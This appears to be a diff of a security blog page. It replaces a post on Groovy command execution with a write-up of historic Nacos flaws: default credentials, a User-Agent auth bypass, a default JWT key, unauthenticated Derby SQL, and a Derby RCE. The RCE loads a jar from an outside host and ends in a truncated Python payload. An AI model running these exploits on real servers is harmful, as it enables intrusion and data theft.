@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Groovy脚本执行 | CurlySean&#39;s Blog</title>
+  <title>CurlySean&#39;s Blog</title>
 
   <link rel="icon" type="image/png" href="/medias/logo.png">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -498,33 +498,24 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp')">
+  background-position: center center;position: relative;background-image:url('https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        Groovy脚本执行
+        
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2025-08-04 |
+          <i class="fas fa-calendar"></i> 发表于：2025-11-09 |
         </span>
       
 
-      
-        <span class="post-detail-header_categories">
-          <i class="iconfont iconbookmark1"></i> 分类：
-          
-            <a href="/categories/Java/" class="post-detail-header_category">
-              Java
-            </a>
-          
-        </span>
       
 
       
@@ -545,128 +536,138 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="eZT12">Groovy脚本执行</h1>
-<h2 id="IQBDG">前言</h2>
-在审计一套源码的时候，mt告诉我的漏洞中，有一个从来没见过没听过的漏洞 —— Groovy脚本执行，今天简单看一下吧
+        <p>Nacos简介</p>
+<p>Nacos 是一个由阿里巴巴开源的动态服务发现、配置管理和服务管理平台，它帮助开发者更轻松地构建、交付和管理微服务应用，实现了服务的注册发现、健康监测以及动态配置管理，让微服务架构中的服务治理与配置更新变得更加高效和灵活。</p>
+<h2 id="Qp5ba">Nacos指纹信息</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;nacos&quot; &amp;&amp; port=&quot;8848&quot;</span><br><span class="line">icon_hash=&quot;13942501&quot; &amp;&amp; port=&quot;8848&quot;</span><br><span class="line">icon_hash=&quot;1227052603&quot; &amp;&amp; port=&quot;8848&quot;</span><br><span class="line">app=&quot;nacos&quot; &amp;&amp; port=&quot;8848&quot; || icon_hash=&quot;13942501&quot;||icon_hash=&quot;1227052603&quot; &amp;&amp; port=&quot;8848&quot;</span><br></pre></td></tr></table></figure>
 
-<p>导入依赖如下：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="oHaDg">Groovy命令执行</h2>
-Groovy 是一种基于 Java 平台的面向对象编程语言
 
-<h3 id="HKPPP">直接执行</h3>
-Groovy脚本允许在脚本中执行系统命令
+<h2 id="lnl1S">Nacos历史漏洞</h2>
+<h3 id="U9VlG">版本信息泄露</h3>
+信息泄露接口
 
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nacos/v1/console/server/state</span><br></pre></td></tr></table></figure>
 
-<p>想要回显执行命令的结果，用<code>.text</code>来接受回显，<code>println</code>来输出回显</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762159601020-39480f4b-6da2-4ee9-abd4-8e65dafc76bc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762159601020-39480f4b-6da2-4ee9-abd4-8e65dafc76bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h3 id="N7lVg">默认密码</h3>
+Nacos系统的默认密码为：`nacos:nacos`
 
-<h3 id="kdz8F">MethodClosure执行</h3>
-MethodClosure允许将方法封装成闭包，便于执行
+<p>登录界面：<code>http://127.0.0.1:8848/nacos/#/login</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762159905831-a699bac5-5583-4f41-a5a0-7b23472aa74a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762159905831-a699bac5-5583-4f41-a5a0-7b23472aa74a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h3 id="iddcj">鉴权绕过</h3>
+<h4 id="IoRkC">默认未开启鉴权</h4>
+`nacos.core.auth.enabled`的默认配置为false
 
-<p>有两种方式：</p>
-<p>使用<code>Runtime.getRuntime.exec()</code></p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160690830-3f0059b0-f9f6-4751-8f66-4132f835427a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160690830-3f0059b0-f9f6-4751-8f66-4132f835427a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在权限验证的<code>AuthFilter</code>中，<code>!authConfigs.isAuthEnabled()</code>在默认情况下为true，因此会跳过鉴权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160819247-7e0925e1-1cc2-4d81-becb-03d8ee4c00b2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160819247-7e0925e1-1cc2-4d81-becb-03d8ee4c00b2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160781721-2379c093-58d1-48d3-a8c3-43d9f0f7e2bd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762160781721-2379c093-58d1-48d3-a8c3-43d9f0f7e2bd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>直接访问<code>/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>，可以未授权查看用户信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762161007954-5f458627-5c58-48c7-ac02-180032eba63b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762161007954-5f458627-5c58-48c7-ac02-180032eba63b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="ZMhD3">User-Agent权限绕过</h4>
+同样的在`AuthFilter`中，除了默认未开启鉴权，后面还有UserAgent的绕过方式
 
-<p>直接执行字符串命令</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call();</span><br></pre></td></tr></table></figure>
+<p>在<code>doFilter</code>方法中，会判断<code>User-Agent</code>头部是否以<code>Nacos-Server</code>开头，如果是则会跳过鉴权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762163400118-23eaf4d7-3394-47c1-b670-a45120a37eed.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762163400118-23eaf4d7-3394-47c1-b670-a45120a37eed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /nacos/v1/auth/users?pageNo=<span class="number">1</span>&amp;pageSize=<span class="number">9</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8848</span></span><br><span class="line">User-Agent: Nacos-Server</span><br></pre></td></tr></table></figure>
 
-<h2 id="ALPXO">Java中执行Groovy脚本</h2>
-在Java中有多种方式可以执行Groovy脚本
+<h4 id="ULj2F">默认JWT密钥</h4>
+影响版本：0.1.0<=nacos<=2.2.0
 
-<h3 id="Uh7Pf">GroovyShell</h3>
-GroovyShell 类用于执行 Groovy 脚本，支持多种数据源
+<p>在Nacos&lt;&#x3D;2.2.0版本中，JWT密钥为默认值，因此我们可以伪造JWT，来进行未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure>
 
-<h4 id="yK6vM">字符串执行</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>;</span><br><span class="line">System.out.println(groovyShell.evaluate(cmd));</span><br></pre></td></tr></table></figure>
+<p>只需要知道用户名，然后修改时间戳即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762164612437-4e21a741-4a47-4137-a7de-74df170b00a8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762164612437-4e21a741-4a47-4137-a7de-74df170b00a8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h3 id="XRV1a">Derby未授权访问</h3>
+<h4 id="mQhgX">DerbySQL注入</h4>
+影响版本：
 
-<h4 id="yg1h1">文件执行</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/java/com/groovy/TestGroovyScript.groovy&quot;</span>);</span><br><span class="line">System.out.println(groovyShell.evaluate(file));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2.x  &lt; 2.4.0</li>
+<li>1.x &lt;&#x3D; 1.4.7</li>
+</ul>
+<p>nacos中带有一个嵌入式的小型数据库derby，默认无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>nacos<span class="operator">/</span>v1<span class="operator">/</span>cs<span class="operator">/</span>ops<span class="operator">/</span>derby?<span class="keyword">sql</span><span class="operator">=</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">*</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users</span><br></pre></td></tr></table></figure>
 
-<h4 id="uR4rV">远程URL执行</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://127.0.0.1:8888/exp.groovy&quot;</span>);</span><br><span class="line">System.out.println(groovyShell.evaluate(uri));</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762165279655-67f69183-0e4e-41c1-8d60-870dcbbd8f87.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762165279655-67f69183-0e4e-41c1-8d60-870dcbbd8f87.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="s29hq">Derby任意代码执行</h4>
+Derby数据库的一个特性为允许加载外部java类，既然可以加载外部java类，那么就能存在任意代码执行的风险
 
-<h3 id="o2xDW">GroovyScripteEngine</h3>
-GroovyScriptEngine 用于从指定源加载和执行 Groovy 脚本
+<p>在<code>/data/removal</code>接口处，会接受POST请求传来的SQL语句文件，并执行里面的SQL语句。在整个处理流程中会有创建临时文件、记录数据、删除临时文件的操作，这里是为什么上传SQL代码是概率性成功的根本原因</p>
+<p>该接口中其中关键函数为<code>onFileUpload</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762175777954-4808a8b1-18c8-4e6a-9b53-28288e2d54bc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762175777954-4808a8b1-18c8-4e6a-9b53-28288e2d54bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>对于上传SQL代码时是概率性成功的的原因，我觉得这个解释说明的很清楚了（可能是由于欠缺一些开发能力的原因，没有准确找到存在问题的代码段）</p>
+<blockquote>
+<p>这里用了类似生产-消费者的模式：</p>
+<ul>
+<li>生产者会产生&#x2F;tmp下的临时数据包，删除数据包的几个过程，消费者对取到的数据包进行导入数据库操作</li>
+<li>个人理解这里的消费者操作是异步的，且代码中没有看到任何锁的机制</li>
+<li>导入数据慢，删除数据快，消费者获取到的数据包很可能已经被删除了，呈现出我们直接访问接口上传恶意数据通常会报”找不到文件错误“</li>
+<li>通过大并发发包，我们产生了大量的文件句柄，使得系统在删除对应的句柄时出现了迟缓，提高了消费者在数据删除前导入数据的机会，可以让消费者成功取到几次数据，实现恶意jar包的导入、从而导致恶意函数的创建。</li>
+</ul>
+</blockquote>
+<h5 id="ocYNK">出网情况下</h5>
+首先我们需要构造一个恶意类，将其打包成jar包，开启http服务将jar包放在可以加载到的位置
 
-<h4 id="YsSeR">本地文件加载脚本</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;src/main/java/com/groovy&quot;</span>);</span><br><span class="line">scriptEngine.run(<span class="string">&quot;TestGroovyScript.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="tIaRE">远程URL加载脚本</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">scriptEngine.run(<span class="string">&quot;exp.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>然后发送该数据包，加载我们的外部java类，并自定义一个函数让我们去调用恶意方法</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/cs/ops/data/removal</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.229.1:8848</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.32.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>489</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=2a262c4e7ea55d81b1906382912b7422</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--2a262c4e7ea55d81b1906382912b7422</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;file&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">CALL</span> sqlj.install_jar(<span class="string">&#x27;http://192.168.244.133:8000/test.jar&#x27;</span>, <span class="string">&#x27;NACOS.jtZJBFpM&#x27;</span>, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">CALL</span> SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(<span class="string">&#x27;derby.database.classpath&#x27;</span>,<span class="string">&#x27;NACOS.jtZJBFpM&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> S_EXAMPLE_jtZJBFpM( PARAM <span class="type">VARCHAR</span>(<span class="number">2000</span>)) <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">2000</span>) PARAMETER STYLE JAVA <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">LANGUAGE</span> JAVA <span class="keyword">EXTERNAL</span> <span class="type">NAME</span> <span class="string">&#x27;test.poc.Example.exec&#x27;</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--2a262c4e7ea55d81b1906382912b7422--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
 
-<h3 id="fOpXr">GroovyScriptEvaluator</h3>
-使用 GroovyScriptEvaluator 执行 Groovy 代码，支持 StaticScriptSource 和 ResourceScriptSource
+<p>不同返回包的不同情况如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//条件竞争失败</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">500</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;File &#x27;/tmp/file3339752271242765906.tmp&#x27; does not exist&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="literal">null</span>&#125;</span><br><span class="line"><span class="comment">//竞争成功</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;message&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="comment">//多次成功</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">500</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;org.springframework.dao.DataIntegrityViolationException: StatementCallback; SQL [CALL sqlj.install_jar(&#x27;http://ip:port/download&#x27;, &#x27;NACOS.hPbTQwag&#x27;, 0);         CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;NACOS.hPbTQwag&#x27;);         CREATE FUNCTION S_EXAMPLE_hPbTQwag( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#x27;test.poc.Example.exec&#x27;]; Jar file &#x27;HPBTQWAG&#x27; already exists in Schema &#x27;NACOS&#x27;.; nested exception is java.sql.BatchUpdateException: Jar file &#x27;HPBTQWAG&#x27; already exists in Schema &#x27;NACOS&#x27;.&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="ZQfkG">使用StaticScriptEvaluator</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyScriptEvaluator</span> <span class="variable">groovyScriptEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEvaluator</span>();</span><br><span class="line"><span class="type">ScriptSource</span> <span class="variable">scriptSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StaticScriptSource</span>(<span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>);</span><br><span class="line">System.out.println(groovyScriptEvaluator.evaluate(scriptSource));</span><br></pre></td></tr></table></figure>
+<p>在我们将恶意jar包加载至数据库后，我们就可以用CVE-2021-29442执行UDF函数进行RCE了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nacos/v1/cs/ops/derby?sql=select+%2A+from+%28select+count%<span class="number">28</span>%2A%<span class="number">29</span>+as+b%2C+S_EXAMPLE_hPbTQwag%<span class="number">28</span>%27whoami%<span class="number">27</span>%<span class="number">29</span>+as+a+from+config_info%<span class="number">29</span>+tmp+%<span class="number">2F</span>%2AROWS+FETCH+NEXT%2A%<span class="number">2F</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="n2Fm4">使用ResourceScript</h4>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Resource</span> <span class="variable">urlResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(<span class="string">&quot;http://127.0.0.1:8888/exp.groovy&quot;</span>);</span><br><span class="line"><span class="type">ScriptSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(urlResource);</span><br><span class="line">System.out.println(groovyScriptEvaluator.evaluate(source));</span><br></pre></td></tr></table></figure>
+<h5 id="gafqF">不出网情况下</h5>
+<h6 id="XNPii">基于PROCEDURE的不出网利用</h6>
+基于PROCEDURE的不出网利用方式，可以先去翻阅一下官方文档：[https://db.apache.org/derby/docs/10.14/ref/rrefexportselectionproclobs.html](https://db.apache.org/derby/docs/10.14/ref/rrefexportselectionproclobs.html)
 
-<h3 id="sYoCe">GroovyClassLoader</h3>
-GroovyClassLoader 用于在 Java 中加载和调用 Groovy 类
+<p>利用<code>SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE</code>函数，我们向服务器中写入任意文件，但是查看官方文档，并不可以覆盖文件，因此利用面小了一些</p>
+<p>在出网的情况下，我们需要去加载远程jar包从而RCE，现在我们可以向服务器中写入文件了，那么在不出网的情况下我们可以去写入jar包，从而加载本地jar包</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;UEsDBBQACAgIAL1uZFsAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICAC9bmRbAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAlY6BnEm5kqaPgXJSbnpCo45xcV5BcllgCVa/Jy8XIBAFBLBwgr8MjHQwAAAEQAAABQSwMECgAACAAAu25kWwAAAAAAAAAAAAAAAAgAAABleGFtcGxlL1BLAwQUAAgICAC7bmRbAAAAAAAAAAAAAAAAEgAAAGV4YW1wbGUvVGVzdC5jbGFzc21RTU/CQBScbYGFAgJiQVT8TgQOcvGG8aDRE6gRYmJMTEpdSJEWUlrDP/LMRYwm/gB/lPpaifhBD+91Z+bNzsu+vT+/AtjDtoIwshyLCiRkFeSw5JVljhWOPMcqQ2jfsAzngEEuFC8ZAke9W8GQqBqWOHXNprAbWrNLSMDUDIshU7iudrR7rdzVrHa57tiG1a74g2IodAa1MJuO1x1Nv6tpfd+OY41CUQoGpd5zbV2cGN4lkYYYOLueQQwRKHTdX7NDt9USNsd6DBvYjCGBLYb0VHU81EXfMXoUNSaGmtnvirJnypCcis6aHaH/hr7cGVJT6MK1HMOkVEpbON8HtVCs/tNUGHZmLf4DOrd7uhgMKhSb06N4nwzmbUk1Sqc8dUY9WBqDjeiHNqAa8kGZhHHMTaQ5n8V/WZBkCSQnsht6dJm6+gLpagy5+oRA6RHB2gMCtRGJwiRN06jkW2RoHH64COFRYhQsEJMiNA3pwysc85w648SQgUqUhMwnUEsHCM5bYSl8AQAAcAIAAFBLAwQUAAgICAC4bmRbAAAAAAAAAAAAAAAAEQAAA